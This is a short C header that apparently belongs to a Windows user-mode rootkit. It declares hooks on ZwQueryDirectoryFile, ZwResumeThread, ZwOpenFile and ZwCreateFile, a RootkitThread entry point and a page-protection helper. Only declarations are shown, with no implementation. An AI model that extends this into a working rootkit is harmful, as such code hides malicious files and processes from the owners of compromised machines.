#include <windows.h>

void HookZwQueryDirectoryFile();
void HookZwResumeThread();
void HookZwOpenFile();
void HookZwCreateFile();

DWORD WINAPI RootkitThread( LPVOID lpData );


void ProtectPage( LPVOID lpAddr, DWORD dwParams );